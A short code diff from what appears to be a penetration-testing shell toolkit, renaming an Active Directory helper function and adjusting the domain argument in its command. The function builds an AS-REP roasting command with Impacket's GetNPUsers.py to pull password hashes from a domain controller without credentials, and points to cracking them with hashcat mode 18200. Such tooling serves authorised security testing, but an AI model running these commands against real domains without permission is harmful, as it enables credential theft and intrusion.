@@ -65,7 +65,7 @@ nb-ad-kerb-kerberoast() {
     fi
 }
 
-nb-ad-asreproast() {
+nb-ad-kerb-asreproast() {
   __ask "Did you enumerate users into a userlist file? (y/n)"
   local sh && __askvar sh "ANSWER"
 
@@ -81,7 +81,7 @@ nb-ad-asreproast() {
 	__ask "Enter a users wordlist"
   __askpath ul FILE $HOME/desktop/projects/
 
-	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile $ul | tee $(__domadpath)/GetNPUsers.txt"
+	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}/ -no-pass -usersfile $ul | tee $(__domadpath)/GetNPUsers.txt"
 
   __info "You can then crack this hash with mode '18200' using 'nb-crack-list'"
 }
